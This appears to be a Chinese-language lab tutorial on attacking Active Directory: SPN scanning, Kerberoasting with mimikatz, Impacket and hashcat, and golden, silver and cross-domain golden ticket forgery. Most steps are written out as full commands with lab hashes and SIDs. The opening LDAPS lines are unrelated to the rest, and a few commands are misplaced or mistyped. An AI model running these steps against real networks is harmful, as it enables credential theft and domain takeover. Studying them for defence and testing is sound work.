LDAPS安装过程：https://gist.github.com/magnetikonline/0ccdabfec58eb1929c997d22e7341e45

上述原文地址：https://chryzsh.github.io/relaying-delegation/

没有什么好的解决方式，若有想法的师傅可以留言哦

## SPN 简介

服务主体名称（SPN：ServicePrincipal Names）是服务实例（可以理解为一个服务，比如 HTTP、MSSQL）的唯一标识符。

Kerberos 身份验证使用 SPN 将服务实例与服务登录帐户相关联。

如果在整个林或域中的计算机上安装多个服务实例，则每个实例都必须具有自己的 SPN。如果客户端可能使用多个名称进行身份验证，则给定服务实例可以  
具有多个 SPN。

SPN 始终包含运行服务实例的主机的名称，因此服务实例可以为其主机的每个名称或别名注册SPN。

如果用一句话来说明的话就是`如果想使用 Kerberos 协议来认证服务，那么必须正确配置 SPN`。

## SPN 格式与配置

在 SPN 的语法中存在四种元素，两个必须元素和两个额外元素，其中和为必须元素：

> /:/  
> ：标识服务类的字符串  
> ：服务所在主机名称  
> ：服务端口  
> ：服务名称

例：  
为 SQL Server 服务帐户注册SPN

手动注册：

> setspn -A MSSQLSvc/myhost.redmond.microsoft.com:1433 accountname

对应的命名实例：

> setspn -A MSSQLSvc/myhost.redmond.microsoft.com/instancename accountname

如果我想把域中一台主机Srv-DB-0day中的 MSSQL 服务注册到 SPN 中则可以使用命令：

> setspn -A MSSQLSvc/Srv-DB-0day.Oday.org:1433 sqladmin

可以通过下面两个命令来查看已经注册的 SPN。

> setspn -q /  
> setspn -T 0day.org -q */*

![image](https://image.3001.net/images/20230425/1682390747_64473edb4ca09b47ce9e7.png!small)

![image](https://image.3001.net/images/20230425/1682390756_64473ee4b91e5b12870c0.png!small)

## SPN扫描

在了解了 Kerberos 和 SPN 之后，可以通过 SPN 来获取想要的信息，比如想知道域内哪些主机安装了什么服务，就不需要再进行批量的网络端口扫描。

在一个大型域中通常会有不止一个的服务注册 SPN，所以可以通过「SPN 扫  
描」的方式来查看域内的服务。

相对于通常的网络端口扫描的优点是不用直接和服务主机建立连接，且隐蔽性更高。

### 扫描工具

#### GetUserSPNs

GetUserSPNs 是 Kerberoast 工具集中的一个 powershell 脚本，`用来查询域内注册的 SPN`。

> Import-module .\GetUserSPNs.ps1

![image](https://image.3001.net/images/20230425/1682390766_64473eee96005b5411e62.png!small)

#### PowerView

PowerView 是由 Will Schroeder（https://twitter.com/harmj0y）开发的 Powershell 脚本

在 Powersploit 和Empire 工具里都有集成，PowerView 相对于上面几种是根据不同用户的 objectsid
来返回，返回的信息更加详细。

> Import-module .\powerview.ps1  
> Get-NetUser -SPN

![image](https://image.3001.net/images/20230425/1682390778_64473efa24b1161400c3b.png!small)

### 原理说明

在 SPN 扫描时可以直接通过脚本，或者命令去获悉内网已经注册的 SPN 内容。

那如果想了解这个过程是如何实现的，就需要提到 LDAP 协议。

LDAP 协议全称是 LightweightDirectory Access Protocol，一般翻译成轻量目录访问协议。

是一种用来查询与更新Active Directory 的目录服务通信协议。

AD 域服务利用 LDAP 命名路径（LDAP naming path）来表示对象在 AD 内  
的位置，以便用它来访问 AD 内的对象。

LDAP 数据的组织方式：

![image](https://image.3001.net/images/20230425/1682390791_64473f07eb2e1d6731c48.png!small)

更直观的说可以把 LDAP 协议理解为一个关系型数据库，其中存储了域内主机的各种配置信息。

在域控中默认安装了 ADSI 编辑器，全称 ActiveDirectory Service Interfaces Editor (ADSI
Edit)，是一种 LDAP 的编辑器，可以通过在域控中运行 adsiedit.msc 来打开（服务器上都有，但是只有域控中的有整个域内的配置信息）。

![image](https://image.3001.net/images/20230425/1682390801_64473f1162d06af0559b5.png!small)

通过 adsiedit.msc 我们可以修改和编辑 LADP，在 SPN 查询时实际上就是查询 LADP 中存储的内容。

比如在我们是实验环境域 0day.org中，存在名为运维组 的一个
OU（OrganizationUnit，可以理解为一个部门，如行政、财务等等），其中包含了 sqlsvr 这个用户，从用户属性中可以看到 sqlsvr
注册过的 SPN 内容。

![image](https://image.3001.net/images/20230425/1682390813_64473f1d7d055dc94c29b.png!small)

在一台主机执行

> setspn -T 0day.org -q */*

命令查询域内 SPN 时，通过抓包可以看到正是通过 LDAP 协议向域控中安装的 LDAP 服务查询了 SPN 的内容。

如图在主机192.168.3.62上执行目录，在域控192.168.3.142可以看到LDAP协议的流量。

![image](https://image.3001.net/images/20230425/1682390822_64473f26cc26b1dfd4e7e.png!small)

流量中的查询结果：

![image](https://image.3001.net/images/20230425/1682390833_64473f31d1a7c1acd99e6.png!small)

Powershell 脚本其实主要就是通过查询 LDAP 的内容并对返回结果做一个过滤，然后展示出来。

## Kerberoasting

介绍 Kerberos 的认证流程时说到，在 KRB_TGS_REP 中，TGS 会返回给 Client 一张票据 ST，而 ST 是由 Client
请求的 Server 端密码进行加密的。

当 Kerberos 协议设置票据为 RC4 方式加密时，我们就可以通过爆破在 Client 端获取的票据 ST，从而获得 Server 端的密码。

下图为设置 Kerberos 的加密方式，在域中可以在域控的「本地安全策略」中进行设置：

![image](https://image.3001.net/images/20230425/1682390847_64473f3f17ceb555a407b.png!small)

设置RC4 方式加密。

![image](https://image.3001.net/images/20230425/1682390860_64473f4c1baf26ac56289.png!small)

设置完成之后运行里输入「gpupdate」刷新组策略，策略生效。

### Kerberoasting攻击方式一

一、在域内主机 PC-Jack 中通过 Kerberoast 中的 GetUserSPNs.vbs 进行 SPN 扫描。

> cscript GetUserSPNs.vbs

![image](https://image.3001.net/images/20230425/1682390871_64473f57d68299ead11ba.png!small)

二、根据扫描出的结果使用微软提供的类 KerberosRequestorSecurityToken 发起 kerberos 请求，申请 ST 票据。

> PS C:> Add-Type -AssemblyName System.IdentityModel  
> PS C:> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken
> -ArgumentList  
> "MSSQLSvc/Srv-Web-Kit.rootkit.org"

![image](https://image.3001.net/images/20230425/1682390880_64473f60ca0235febc260.png!small)

三、Kerberos 协议中请求的票据会保存在内存中，可以通过 klist 命令查看当前会话存储的 kerberos 票据。

![image](https://image.3001.net/images/20230425/1682390890_64473f6a649a41f95e315.png!small)

使用 mimikatz 导出。

> kerberos::list /export

![image](https://image.3001.net/images/20230425/1682390945_64473fa1f2b93d8887b25.png!small)

使用 kerberoast 工具集中的 tgsrepcrack.py 工具进行离线爆破，成功得到jerry账号的密码`admin!@#45`

> python2 tgsrepcrack.py wordlist.txt "1-40a10000-jerry@MSSQLSvc~Srv-Web-> Kit.rootkit.org-ROOTKIT.ORG.kirbi"

![image](https://image.3001.net/images/20230425/1682390959_64473faff2494738ada00.png!small)

### Kerberoasting攻击方式二

Kerberoasting攻击方式一中需要通过 mimikatz 从内存中导出票据，Invoke-Kerberoast 通过提取票据传输时的原始字节，转换成
John the Ripper 或者 HashCat 能够直接爆破的字符串。

使用 Invoke-Kerberoast 脚本 (这里使用的是 Empire 中的 Invoke-Kerberoast.ps1)。

> Import-module Invoke-Kerberoast.ps1  
> Invoke-kerberoast -outputformat hashcat |fl

–outputformat 参数可以指定输出的格式，可选 John the Ripper 和 Hashcat 两种格式

![image](https://image.3001.net/images/20230425/1682390972_64473fbcc09303b88ed7c.png!small)

二、使用 HASHCAT 工具进行破解：

> PSC:> hashcat64.exe –m 13100 test1.txt password.list --force

![image](https://image.3001.net/images/20230425/1682390983_64473fc7d6aff4c586390.png!small)

## Impacket 进行Kerberoasting

这里要用到impacket工具包，该工具包用于对SMB1-3或IPv4 / IPv6
上的TCP、UDP、ICMP、IGMP，ARP，IPv4，IPv6，SMB，MSRPC，NTLM，Kerberos，WMI，LDAP等协议进行低级编程访问。

这里我们使用的是GetUserSPNs工具，可使用该工具对目标主机进行SPN探测。

> https://github.com/SecureAuthCorp/impacket 官方仓库  
> https://github.com/maaaaz/impacket-examples-windows
> 有人已将各个脚本打包成相应的exe,此处绝大部分也都将全部用这些exe单文件来进行操作

其命令用法如下：

> python GetUserSPNs.py -request -dc-ip x.x.x.x 域名称/域用户

输入当前域用户的密码，即可的到票据。

![image](https://image.3001.net/images/20230425/1682390994_64473fd2da19b1f222e0d.png!small)

同样对票据进行爆破。

> hashcat64.exe –m 13100 test1.txt password.list --force

![image](https://image.3001.net/images/20230425/1682391007_64473fdf0f1a67df13799.png!small)

## GoldenTicket

### 简介

Golden Ticket（下面称为金票）是通过伪造的TGT（TicketGranting
Ticket），因为只要有了高权限的TGT，那么就可以发送给TGS换取任意服务的ST。

可以说有了金票就有了域内的最高权限。

 **制作金票的条件：**

> 1、域名称  
> 2、域的SID值  
> 3、域的KRBTGT账户密码HASH  
> 4、伪造用户名，可以是任意的

### 利用过程

金票的生成需要用到krbtgt的密码HASH值，可以通过mimikatz中的

> lsadump::dcsync /OWA2010SP3.0day.org /user:krbtgt

命令获取krbtgt的值。

![image](https://image.3001.net/images/20230425/1682391018_64473fea3997c761b6f0c.png!small)

得到KRBTGT HASH之后使用mimikatz中的kerberos::golden功能生成金票golden.kiribi，即为伪造成功的TGT。

参数说明：

> /admin：伪造的用户名  
> /domain：域名称  
> /sid：SID值，注意是去掉最后一个-后面的值  
> /krbtgt：krbtgt的HASH值  
> /ticket：生成的票据名称

> kerberos::golden /admin:administrator /domain:0day.org
> /sid:S-1-5-21-1812960810-2335050734-3517558805
> /krbtgt:36f9d9e6d98ecf8307baf4f46ef842a2 /ticket:golden.kiribi

![image](https://image.3001.net/images/20230425/1682391028_64473ff48ba2839ba08fe.png!small)

通过mimikatz中的kerberos::ptt功能（Pass The Ticket）将golden.kiribi导入内存中。

> kerberos::purge  
> kerberos::ppt golden.kiribi  
> kerberos::list

![image](https://image.3001.net/images/20230425/1682391039_64473fff8f2ad171cae2b.png!small)

此时就可以通过dir成功访问域控的共享文件夹。

> dir \OWA2010SP3.0day.org\c$

![image](https://image.3001.net/images/20230425/1682391051_6447400b346c8fec55d34.png!small)

## SilverTickets

### 简介

Silver Tickets（下面称银票）就是伪造的ST（Service
Ticket），因为在TGT已经在PAC里限定了给Client授权的服务（通过SID的值），所以银票只能访问指定服务。

 **制作银票的条件：**

> 1.域名称  
> dir \OWA2010SP3.0day.org\c$  
> 2.域的SID值  
> 3.域的服务账户的密码HASH（不是krbtgt，是域控）  
> 4.伪造的用户名，可以是任意用户名，这里是silver

### 利用过程

首先我们需要知道服务账户的密码HASH，这里同样拿域控来举例，通过mimikatz查看当前域账号administrator的HASH值。

注意，这里使用的不是Administrator账号的HASH，而是OWA2010SP3$的HASH

> sekurlsa::logonpasswords

![image](https://image.3001.net/images/20230425/1682391062_644740162b25d441778d2.png!small)

这时得到了OWA2010SP3$的HASH值，通过mimikatz生成银票。

 **参数说明：**

>   * /domain：当前域名称
>
>   * /sid：SID值，和金票一样取前面一部分
>
>   * /target：目标主机，这里是OWA2010SP3.0day.org
>
>   * /service：服务名称，这里需要访问共享文件，所以是cifs
>
>   * /rc4：目标主机的HASH值
>
>   * /user：伪造的用户名
>
>   * /ptt：表示的是Pass
> TheTicket攻击，是把生成的票据导入内存，也可以使用/ticket导出之后再使用kerberos::ptt来导入
>
>

> kerberos::golden /domain:0day.org
> /sid:S-1-5-21-1812960810-2335050734-3517558805 /target:OWA2010SP3.0day.org
> /service:cifs /rc4:125445ed1d553393cce9585e64e3fa07 /user:silver /ptt

![image](https://image.3001.net/images/20230425/1682391072_644740208c04f2c3a1cbe.png!small)

这时通过klist查看当前会话的kerberos票据可以看到生成的票据.

![image](https://image.3001.net/images/20230425/1682391082_6447402a8e8d85e63477f.png!small)

使用`dir \\\OWA2010SP3.0day.org\c$`访问DC的共享文件夹。

![image](https://image.3001.net/images/20230425/1682391091_64474033e4b236cf11e40.png!small)

## EnhancedGolden Tickets

在Golden Ticket部分说明可利用krbtgt的密码HASH值生成金票，从而能够获取域控权限同时能够访问域内其他主机的任何服务。

但是普通的金票不能够跨域使用，也就是说金票的权限被限制在当前域内。

### 域树与域林

在下图中 UKNOWSEC.CN 为其他两个域的根域，NEWS.UKNOWSEC.CN和 DEV.UKNOWSEC.CN
均为UKNOWSEC.CN的子域，这三个域组成了一个域树。

子域的概念可以理解为一个集团在不同业务上分公司，他们有业务重合的点并且都属于 UKNOWSEC.CN这个根域，但又独立运作。

同样 TEST.COM 也是一个单独的域树，两个域树UKONWSE.CN 和 TEST.CN 组合起来被称为一个域林。

![image](https://image.3001.net/images/20230425/1682391102_6447403ed3bd44fc55dd9.png!small)

### 普通金票的局限性

在上图中说到UKNOWSEC.CN为其他两个域（NEWS.UKNOWSEC.CN和DEV.UKNOWSEC.CN）的根域，根域和其他域的最大的区别就是根域对整个域林都有控制权。

而域正是根据Enterprise Admins组来实现这样的权限划分。

 **Enterprise Admins组**

EnterpriseAdmins组是域中用户的一个组，只存在于一个林中的根域中，这个组的成员，这里也就是UKNOWSEC.CN中的Administrator用户（不是本地的Administrator，是域中的Administrator）对域有完全管理控制权。

UKNOWSEC.CN的域控上Enterprise Admins组的RID为519.

 **Domain Admins组**

子域中是不存在EnterpriseAdmins组的，在一个子域中权限最高的组就是Domain Admins组。

NEWS.UKNOWSEC.CN这个子域中的Administrator用户，这个Administrator有当前域的最高权限。

### 突破限制

普通的黄金票据被限制在当前域内，在2015年Black Hat USA中国外的研究者提出了突破域限制的增强版的黄金票据。

通过域内主机在迁移时LDAP库中的SIDHistory属性中保存的上一个域的SID值制作可以跨域的金票。

如果知道根域的SID那么就可以通过子域的KRBTGT的HASH值，使用mimikatz创建具有
EnterpriseAdmins组权限（域林中的最高权限）的票据。

然后通过mimikatz重新生成包含根域SID的新的金票

> kerberos::golden /admin:administrator /domain:news.uknowsec.cn /sid:XXX
> /sids:XXX /krbtgt:XXX /startoffset:0 /endin:600 /renewmax:10080 /ptt

Startoffset和endin分别代表偏移量和长度，renewmax表示生成的票据的最长时间。

注意这里是不知道根域UKONWSEC.CN的krbtgt的密码HASH的，使用的是子域NEWS.UKNOWSEC.CN中的KRBTGT的密码HASH。

然后就可以通过dir访问DC. UKNOWSEC的共享文件夹，此时的这个票据票是拥有整个域林的控制权的。

